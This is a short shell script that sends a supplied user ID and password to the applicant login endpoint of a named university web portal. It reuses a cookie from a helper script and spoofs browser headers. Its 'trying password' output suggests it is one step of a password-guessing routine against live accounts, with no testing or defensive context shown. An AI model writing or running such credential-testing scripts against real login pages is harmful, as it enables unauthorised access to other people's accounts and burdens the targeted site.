
if [ "$#" -eq 0 ]; then
    echo "Usage: $0 <userid> <password>"
    exit 1
fi
echo "user: $1 , trying password: $2"
x=$(./cookie.sh)
echo "$x"

curl -X POST   http://app55.nu.edu.bd/nu-web/checkApplicantValidity   -H 'Host: app55.nu.edu.bd'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Origin: http://app55.nu.edu.bd'   -H 'Connection: keep-alive'   -H 'Referer: http://app55.nu.edu.bd/nu-web/applicantLogin?errorMessage=Invalid+Application+Roll+No.+or+Pin+Number.'   -H "Cookie: $x"   -H 'Upgrade-Insecure-Requests: 1'   -d "userId=$1&password=$2&sessionId=Honours" -v




